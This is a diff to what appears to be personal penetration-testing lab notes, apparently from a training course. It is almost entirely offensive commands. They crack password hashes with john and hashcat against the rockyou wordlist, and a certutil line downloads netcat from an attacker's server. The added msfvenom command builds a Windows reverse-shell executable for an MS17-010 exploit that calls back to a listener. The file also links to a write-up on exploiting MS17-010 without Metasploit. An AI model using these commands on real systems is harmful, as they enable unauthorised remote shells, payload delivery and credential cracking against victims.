@@ -12,3 +12,8 @@ john --format:NT hash.txt /usr/share/wordlists/rockyou.txt
 rdesktop -u user -p password321 10.10.184.18
 certutil -urlcache -f http://<IP>/nc.exe c:\Users\admin\Desktop\nc.exe
 hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt~                                                                
+
+Saved as: ms17-010.exe
+
+https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/
+root@Kali:~/PTP/2.5_Exploitation/Lab 4# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.73 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe
